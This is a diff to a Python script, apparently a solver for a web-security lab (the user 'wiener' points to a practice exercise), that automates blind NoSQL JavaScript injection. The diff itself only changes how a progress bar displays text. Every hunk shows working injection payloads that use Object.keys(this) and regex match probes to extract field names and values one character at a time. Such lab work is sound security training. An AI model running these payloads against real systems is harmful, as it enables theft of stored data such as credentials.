@@ -61,7 +61,7 @@ def get_number_of_fields(session, url):
     while True:
         payload = f"wiener' && Object.keys(this).length=={count}"
         
-        progress_bar.status(payload[-200:])
+        progress_bar.status(payload)
         
         if make_request(session, url, payload):
             log.success(f"Fields found: {count}")
@@ -81,7 +81,7 @@ def get_field_lengths(session, url, total_fields):
         while True:
             payload = f"wiener' && Object.keys(this)[{current_field_index}].length=={current_length}"
             
-            progress_bar.status(payload[-200:])
+            progress_bar.status(payload)
             
             if make_request(session, url, payload):
                 field_lengths_list.append(current_length)
@@ -117,7 +117,7 @@ def get_field_names(session, url, field_lengths_list):
                 
                 payload = f"wiener' && Object.keys(this)[{current_field_index}].match('^.{{{current_position}}}{escaped_character}.*')"
                 
-                progress_bar.status(payload[-200:])
+                progress_bar.status(payload)
                 
                 if make_request(session, url, payload):
                     extracted_field_name += character
@@ -153,7 +153,7 @@ def get_field_value_lengths(session, url, field_names_list, field_indexes):
         while True:
             payload = f"wiener' && this.{current_field_name}.valueOf().toString().length=={current_value_length}"
             
-            progress_bar.status(payload[-200:])
+            progress_bar.status(payload)
             
             if make_request(session, url, payload):
                 field_value_lengths[current_field_name] = current_value_length
@@ -196,7 +196,7 @@ def get_field_value_names(session, url, field_names_list, field_value_lengths, f
                 
                 payload = f"wiener' && this.{current_field_name}.valueOf().toString().match('^.{{{current_position}}}{escaped_character}.*')"
                 
-                progress_bar.status(payload[-200:])
+                progress_bar.status(payload)
                 
                 if make_request(session, url, payload):
                     extracted_field_value += character
